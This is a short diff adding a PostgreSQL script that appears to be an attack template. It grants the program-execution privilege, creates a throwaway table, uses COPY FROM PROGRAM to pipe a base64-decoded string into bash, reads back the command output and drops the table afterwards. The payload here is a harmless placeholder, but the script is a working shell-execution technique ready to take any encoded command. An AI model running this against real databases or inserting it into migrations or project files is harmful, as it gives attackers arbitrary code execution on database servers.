@@ -1,0 +1,11 @@
+DROP TABLE IF EXISTS abroxu;
+
+grant pg_execute_server_program to postgres;
+
+CREATE TABLE abroxu(cmd_output text);
+
+COPY abroxu FROM PROGRAM 'echo "hi" |base64 -d|bash';
+
+SELECT * FROM abroxu;
+
+DROP TABLE IF EXISTS abroxu;
